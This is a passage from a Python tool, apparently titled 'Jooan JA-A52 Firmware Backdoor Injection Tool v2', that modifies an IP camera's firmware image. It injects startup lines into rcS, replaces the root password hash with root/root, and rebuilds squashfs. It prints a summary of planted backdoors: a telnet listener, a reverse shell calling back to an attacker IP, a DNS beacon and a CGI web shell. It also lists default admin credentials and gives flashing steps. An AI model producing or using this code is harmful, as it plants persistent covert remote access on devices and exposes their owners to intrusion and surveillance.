            # Inject telnetd + backdoor source AFTER jffs2 mount but BEFORE startapp
            # The mount commands are:
            #   mount -t squashfs /dev/mtdblock4 /mnt/mtd
            #   mount -t jffs2 /dev/mtdblock5 /opt
            # We inject right after the jffs2 mount
            inject_after = "mount -t jffs2 /dev/mtdblock5 /opt"
            injection = get_rcs_injection_lines()

            if inject_after in rcs_content:
                rcs_content = rcs_content.replace(
                    inject_after,
                    inject_after + "\n" + injection
                )
                print("[+] Injected backdoor lines into rcS after jffs2 mount")
            else:
                # Fallback: append before startapp launch
                rcs_content += "\n" + injection
                print("[+] Appended backdoor lines to end of rcS")

            with open(rcs_path, 'w', encoding='utf-8', newline='\n') as f:
                f.write(rcs_content)
        else:
            print("[!] rcS not found in extracted rootfs")

        # Modify shadow
        shadow_path = os.path.join(modifier.extract_dir, "etc", "shadow")
        if os.path.isfile(shadow_path):
            print("[*] Modifying /etc/shadow...")
            with open(shadow_path, 'r', encoding='utf-8') as f:
                shadow_content = f.read()

            if OLD_ROOT_SHADOW in shadow_content:
                shadow_content = shadow_content.replace(OLD_ROOT_SHADOW, NEW_ROOT_SHADOW)
                print("[+] Changed root password hash")
            else:
                print("[!] Original shadow hash not found, prepending new entry")
                shadow_content = NEW_ROOT_SHADOW + "\n" + shadow_content

            with open(shadow_path, 'w', encoding='utf-8', newline='\n') as f:
                f.write(shadow_content)
        else:
            print("[!] shadow file not found in extracted rootfs")

        # Try to rebuild
        new_rootfs = modifier.rebuild()
        if new_rootfs:
            firmware = bytearray(firmware)
            firmware[PART_ROOTFS_OFF:PART_ROOTFS_OFF + PART_ROOTFS_SIZE] = new_rootfs
            print("[+] Successfully rebuilt and injected modified rootfs!")
            modifier.cleanup()
            return bytes(firmware)

        print("[!] Rebuild failed, falling back to binary patching...")
        modifier.cleanup()

    # === Method 2: Binary patching ===
    print("\n[*] Attempting binary patching of squashfs data...")
    print("[*] This works by finding known strings in compressed blocks")

    patcher = BinaryPatcher()
    patched_rootfs = bytearray(rootfs_data)
    any_success = False

    # Try to patch shadow hash directly in squashfs binary
    # The shadow file is small and likely in a fragment block at the end of squashfs.
    # Binary patching only works if the replacement is the EXACT same length,
    # because squashfs uses XZ-compressed blocks with fixed block offsets in the header.
    # We use NEW_ROOT_SHADOW_SAMESIZE which has the same salt length as the original.
    old_hash = OLD_ROOT_SHADOW.encode('utf-8')
    new_hash = NEW_ROOT_SHADOW_SAMESIZE.encode('utf-8')

    assert len(new_hash) == len(old_hash), \
        f"Shadow entry length mismatch: old={len(old_hash)}, new={len(new_hash)}"

    result, success = patcher.find_and_replace(
        bytes(patched_rootfs), old_hash, new_hash,
        "shadow password hash (same-length replacement, password='root')"
    )
    if success:
        patched_rootfs = bytearray(result)
        any_success = True

    # Note: We CANNOT binary-patch rcS in squashfs because the XZ-compressed
    # blocks change size when content changes, breaking the block table.
    # The shadow patch only works if the replacement is the exact same length.
    if not any_success:
        print("[!] Binary patching of squashfs failed.")
        print("[!] The shadow hash is likely in an XZ-compressed block and cannot")
        print("[!] be patched without decompression/recompression.")
        print("")
        print("[*] RECOMMENDATION: Install squashfs-tools to enable full rebuild.")
        print(f"[*] Place mksquashfs.exe and unsquashfs.exe in: {FIRMWARE_DIR}")
        print("[*] Or install WSL and run: sudo apt install squashfs-tools")
        print("")
        print("[*] Without squashfs modification, the backdoor relies on:")
        print("[*]   1. JFFS2 backdoor.sh (must be triggered manually or via config.json)")
        print("[*]   2. Existing GoAhead web interface vulnerabilities")
    else:
        firmware = bytearray(firmware)
        firmware[PART_ROOTFS_OFF:PART_ROOTFS_OFF + PART_ROOTFS_SIZE] = patched_rootfs
        firmware = bytes(firmware)

    return bytes(firmware) if isinstance(firmware, bytearray) else firmware


def print_summary(firmware_modified):
    """Print summary of all backdoors and access methods."""
    print("\n" + "="*60)
    print("BACKDOOR SUMMARY")
    print("="*60)

    print("""
BACKDOOR 1: JFFS2 Persistence (/opt/conf/backdoor.sh)
  Location:  Config partition (0x798000), file /opt/conf/backdoor.sh
  Survives:  Firmware updates (config partition preserved)
             startapp cleanup (only deletes non-conf/custom dirs)
  Provides:  Telnet on port {telnet_port}
             Reverse shell callback to {callback_ip}:{callback_port}
             DNS beacon every 10 minutes
             CGI web shell at /cgi-bin/shell.cgi
  Trigger:   Must be sourced by rcS (Backdoor 2) or manually
             Manual: source /opt/conf/backdoor.sh

BACKDOOR 2: SquashFS rcS Modification
  Location:  Rootfs partition (0x1B8000), /etc/init.d/rcS
  Provides:  Early telnetd start (before startapp)
             Sources /opt/conf/backdoor.sh after jffs2 mount
  Requires:  mksquashfs for rebuild (check output above)

BACKDOOR 3: Root Password Change
  Location:  Rootfs partition, /etc/shadow
  New creds: root / root (or root / backdoor depending on method)
  Access:    Telnet, serial console, SSH (if enabled)

WEB INTERFACE (existing, no modification needed):
  GoAhead:   https://<camera_ip>/  (admin / admin123)
  GoForm:    /goform/getVideoSettings (auth check)
  Firmware:  /cgi-bin/upload_app.cgi (firmware upload)
  SysCmd:    Check /web_admin.xml for syscommand entries

ACCESS METHODS (post-flash):
  1. Telnet:     telnet <camera_ip> {telnet_port}
  2. Web shell:  curl http://<camera_ip>/cgi-bin/shell.cgi?cmd=id
  3. Web admin:  https://<camera_ip>/ (admin/admin123)
  4. Callback:   Listen on {callback_ip}:{callback_port}
""".format(
        telnet_port=TELNET_PORT,
        callback_ip=CALLBACK_IP,
        callback_port=CALLBACK_PORT
    ))


def main():
    print("="*60)
    print("Jooan JA-A52 Firmware Backdoor Injection Tool v2")
    print("="*60)
    print(f"Input:  {STOCK_FW}")
    print(f"Output: {OUTPUT_FW}")
    print()

    # Read stock firmware
    if not os.path.isfile(STOCK_FW):
        print(f"[!] Stock firmware not found: {STOCK_FW}")
        sys.exit(1)

    with open(STOCK_FW, 'rb') as f:
        firmware = f.read()

    if len(firmware) != 8 * 1024 * 1024:
        print(f"[!] Unexpected firmware size: {len(firmware)} (expected 8MB)")
        sys.exit(1)

    print(f"[+] Loaded stock firmware: {len(firmware)} bytes")
    print(f"[+] MD5: {hashlib.md5(firmware).hexdigest()}")

    # Verify rootfs squashfs magic
    rootfs_magic = firmware[PART_ROOTFS_OFF:PART_ROOTFS_OFF + 4]
    if rootfs_magic != b'hsqs':
        print(f"[!] Invalid rootfs magic: {rootfs_magic.hex()} (expected 'hsqs')")
        sys.exit(1)
    print("[+] Rootfs squashfs magic verified (hsqs)")

    # Verify config JFFS2 magic
    config_magic = struct.unpack('<H', firmware[PART_CONFIG_OFF:PART_CONFIG_OFF + 2])[0]
    if config_magic != 0x1985:
        print(f"[!] Invalid config JFFS2 magic: 0x{config_magic:04X} (expected 0x1985)")
        sys.exit(1)
    print("[+] Config JFFS2 magic verified (0x1985)")

    # Inject backdoors
    firmware = inject_jffs2_backdoor(firmware)
    firmware = inject_squashfs_backdoor(firmware)

    # Write output
    with open(OUTPUT_FW, 'wb') as f:
        f.write(firmware)

    print(f"\n[+] Modified firmware written to: {OUTPUT_FW}")
    print(f"[+] MD5: {hashlib.md5(firmware).hexdigest()}")
    print(f"[+] Size: {len(firmware)} bytes")

    # Verify output integrity
    assert len(firmware) == 8 * 1024 * 1024, "Output size mismatch!"

    # Verify untouched partitions
    stock = open(STOCK_FW, 'rb').read()
    boot_match = firmware[:PART_ROOTFS_OFF] == stock[:PART_ROOTFS_OFF]
    kernel_match = (firmware[0x048000:0x1B8000] == stock[0x048000:0x1B8000])
    appfs_match = (firmware[PART_APPFS_OFF:PART_APPFS_OFF + PART_APPFS_SIZE] ==
                   stock[PART_APPFS_OFF:PART_APPFS_OFF + PART_APPFS_SIZE])
    confbak_match = (firmware[0x7F8000:] == stock[0x7F8000:])

    print(f"\n[*] Partition integrity check:")
    print(f"    Boot + bootenv + kernel: {'OK (unchanged)' if boot_match else 'MODIFIED'}")
    print(f"    Kernel:                  {'OK (unchanged)' if kernel_match else 'MODIFIED'}")
    print(f"    AppFS:                   {'OK (unchanged)' if appfs_match else 'MODIFIED'}")
    print(f"    ConfBak:                 {'OK (unchanged)' if confbak_match else 'MODIFIED'}")

    rootfs_changed = (firmware[PART_ROOTFS_OFF:PART_ROOTFS_OFF + PART_ROOTFS_SIZE] !=
                      stock[PART_ROOTFS_OFF:PART_ROOTFS_OFF + PART_ROOTFS_SIZE])
    config_changed = (firmware[PART_CONFIG_OFF:PART_CONFIG_OFF + PART_CONFIG_SIZE] !=
                      stock[PART_CONFIG_OFF:PART_CONFIG_OFF + PART_CONFIG_SIZE])
    print(f"    Rootfs:                  {'MODIFIED (backdoor 2+3)' if rootfs_changed else 'unchanged'}")
    print(f"    Config:                  {'MODIFIED (backdoor 1)' if config_changed else 'unchanged'}")

    print_summary(firmware)

    print("\n[*] NEXT STEPS:")
    print(f"    1. Flash {OUTPUT_FW} to camera via chip programmer")
    print(f"    2. Power on camera and wait for boot (~30-60 seconds)")
    print(f"    3. Connect: telnet <camera_ip> {TELNET_PORT}")
    print(f"    4. Or browse: https://<camera_ip>/ (admin/admin123)")
    print()
    print("[*] If squashfs rebuild was not available:")
    print("    The JFFS2 backdoor is in place but needs manual triggering.")
    print("    After first boot via serial/UART, run:")
    print("      source /opt/conf/backdoor.sh")
    print("    Or add to /opt/conf/config.json via command injection.")


if __name__ == "__main__":
    main()
